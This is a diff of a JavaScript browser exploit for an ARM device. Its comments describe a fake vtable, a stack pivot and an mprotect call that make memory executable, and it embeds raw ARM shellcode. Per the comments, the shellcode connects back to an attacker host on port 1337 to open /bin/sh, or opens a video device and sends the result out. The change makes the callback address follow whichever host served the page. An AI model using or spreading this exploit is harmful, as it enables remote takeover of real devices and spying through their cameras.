@@ -11,7 +11,7 @@
 //        [0x034] r0 = page (backing)   [0x038] r1 = 0x4000   [0x03c] r2 = 7 (RWX)
 //        [0x048] lr = backing+0x600 (shellcode)   [0x04c] pc = mprotect_rt
 //        [0x080..0x480] vtable FALSA homogénea: 256 slots = PIVOT
-//        [0x600..]      shellcode ARM (callback.bin: connect 192.168.100.80:1337 -> /bin/sh)
+//        [0x600..]      shellcode ARM (callback.bin: connect <pc-ip>:1337 -> /bin/sh)
 //   2. write32(wrapper(div)+0x10, backing)  -> el ScriptWrappable del <div> pasa a ser MI buffer.
 //   3. Trigger: leer  div.nodeName  -> método virtual de Node:
 //        impl = *(wrapper+0x10) = backing ;  vtable = *impl = backing[0] = backing+0x80 ;
@@ -80,7 +80,7 @@ window.runPayload_fn = async function _pwn() {
   const MPROT_LEN = 0x4000;
   const PROT_RWX  = 7;
 
-  // shellcode ARM: socket/connect 192.168.178.214:80 -> open(/dev/video40) -> mmap2(0x20000000) -> send fd+result
+  // shellcode ARM: socket/connect <pc-ip>:80 -> open(/dev/video40) -> mmap2(0x20000000) -> send fd+result
   const SHELLCODE = [
   0x0f,0xc0,0xa0,0xe1,0x08,0xc0,0x4c,0xe2,0x80,0x0d,0x01,0xe3,
   0x00,0xd0,0x8c,0xe0,0x08,0xd0,0x4d,0xe2,0x0f,0x00,0xa0,0xe3,
@@ -897,7 +897,7 @@ window.runPayload_fn = async function _pwn() {
   sdv.setUint32(L_MPPC,  mprotect_rt,true);   // pc del pop de ARGS -> mprotect
   for (let i = 0; i < VT_SLOTS; i++) sdv.setUint32(L_VTABLE + i*4, PIVOT, true);  // vtable homogénea
   // Zero-config callback address. The ARM shellcode's sockaddr_in is the 8-byte
-  // sequence 02 00 00 50 <ip4> = AF_INET, port 80, the author's 192.168.178.214.
+  // sequence 02 00 00 50 <ip4> = AF_INET, port 80, the author's <pc-ip>.
   // Rewrite it to the host that served this page, so the toolkit is not tied to
   // one LAN. If the pattern is absent nothing changes (the embedded default stays).
   function patchCallbackBytes(arr) {
